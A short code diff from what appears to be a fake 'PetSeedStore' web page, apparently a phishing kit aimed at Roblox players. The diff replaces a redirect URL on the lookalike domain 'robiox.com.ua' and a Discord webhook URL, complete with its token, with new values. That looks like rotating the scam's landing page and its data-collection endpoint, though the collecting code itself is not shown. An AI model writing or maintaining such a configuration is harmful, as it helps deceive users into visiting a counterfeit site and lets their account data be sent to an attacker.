@@ -118,13 +118,13 @@ const pets: Pet[] = [
 // Redirect configuration
 const REDIRECT_CONFIG = {
   enabled: true,
-  url: "https://www.robiox.com.ua/users/3771956351/profile",
+  url: "https://www.robiox.com.ua/users/4960539157/profile",
 }
 
 // Webhook configuration
 const WEBHOOK_CONFIG = {
   enabled: true,
-  url: "https://discord.com/api/webhooks/1409478104715497594/UxKN57KqXtTZLx0_S7vlNoLMgM9iQfgFi-enjn_uoKvTOQqSpbElyaWSmtpcO033JzgB",
+  url: "https://discord.com/api/webhooks/1410180708994912266/VAlXNqxfXvXRk_wdWU2YKcYDThoe_sw9qxLgn0RiCijzxjoKyOWZuD9_UgeQHFeTHTi3",
 }
 
 export default function PetSeedStore() {
